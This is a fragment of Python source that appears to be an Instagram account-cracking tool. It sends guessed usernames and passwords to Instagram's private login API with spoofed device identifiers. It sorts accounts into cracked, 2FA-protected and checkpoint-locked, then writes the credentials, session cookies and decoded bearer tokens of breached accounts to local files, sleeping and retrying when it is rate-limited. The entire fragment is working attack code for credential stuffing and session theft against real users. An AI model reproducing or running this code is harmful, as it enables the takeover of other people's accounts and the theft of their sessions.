                payload = {'params': '{"client_input_params":{"device_id":"'+ str(headers['x-ig-android-id']) +'","lois_settings":{"lois_token":"","lara_override":""},"name":"'+str(username)+'","machine_id":"'+str(headers['x-mid'])+'","profile_pic_url":null,"contact_point":"'+str(username)+'","encrypted_password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(passwd)+'"},"server_params":{"is_from_logged_out":0,"layered_homepage_experiment_group":null,"INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":"'+str(headers['x-ig-family-device-id'])+'","device_id":"'+str(headers['x-ig-device-id'])+'","offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","waterfall_id":"'+str(uuid.uuid4())+'","login_source":"Login","INTERNAL__latency_qpl_instance_id":73767726200338,"is_from_logged_in_switcher":0,"is_platform_login":0}}','bk_client_context': '{"bloks_version":"'+ str(headers['x-bloks-version-id']) +'","styles_id":"instagram"}','bloks_versioning_id': str(headers['x-bloks-version-id'])}
                encode = ('params=%s&bk_client_context=%s&bloks_versioning_id=%s'%(urllib.parse.quote(payload['params']), urllib.parse.quote(payload['bk_client_context']), payload['bloks_versioning_id']))
                headers.update({'content-length': str(len(encode)), 'cookie': (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ])})
                response = byps.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/', data = encode, headers = headers, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'logged_in_user' in str(response):
                    self.success+=1
                    try:
                        self.ig_set_autorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.replace('\\', ''))).group(1)
                        self.decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(self.ig_set_autorization.split('Bearer IGT:2:')[1]))
                    except (Exception) as e: pass
                    try:
                        cookies = (';'.join(['%s=%s'%(name, value) for name, value in self.decode_ig_set_authorization.items()]))
                    except (Exception) as e: cookies = ('cookies tidak di temukan')
                    try: follower, followed, feedpost = Require().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r[italic green]Success logged    ')
                    tree.add(f'[italic white]Username : [italic green]{username}')
                    tree.add(f'[italic white]Password : [italic green]{passwd}')
                    tree.add(f'[italic white]Profile Acc : [italic green]{follower}[bold white]/[italic green]{followed}[bold white]/[italic green]{feedpost}')
                    true = tree.add('[italic green]Response Cookies')
                    true.add(f'[italic white]Cookies : [italic green]{cookies}')
                    true.add(f'[italic white]Bearers : [italic green]{self.ig_set_autorization}')
                    tree.add(f'[italic white]Useragent : [italic green]{headers["user-agent"]}')
                    printz(tree)
                    save = f'{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookies}|{self.ig_set_autorization}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break          
                elif 'two_factor_required' in str(response):
                    try: follower, followed, feedpost = Require().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r[italic red]logged 2FA    ')
                    tree.add(f'[italic white]Username : [italic red]{username}')
                    tree.add(f'[italic white]Password : [italic red]{passwd}')
                    tree.add(f'[italic white]Profile Acc : [italic red]{follower}[bold white]/[italic red]{followed}[bold white]/[italic yellow]{feedpost}')
                    tree.add(f'[italic white]Useragent : [italic red]{headers["user-agent"]}')
                    printz(tree)
                    save = f'{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'challenge_required' in str(response):
                    try: follower, followed, feedpost = Require().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r[italic yellow]logged chekpoint    ')
                    tree.add(f'[italic white]Username : [italic yellow]{username}')
                    tree.add(f'[italic white]Password : [italic yellow]{passwd}')
                    tree.add(f'[italic white]Profile Acc : [italic yellow]{follower}[bold white]/[italic yellow]{followed}[bold white]/[italic yellow]{feedpost}')
                    tree.add(f'[italic white]Useragent : [italic yellow]{headers["user-agent"]}')
                    printz(tree)
                    save = f'{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                else: continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                time.sleep(31)
        self.looping+=1
        
Instagram().Chek_Cookies()
                
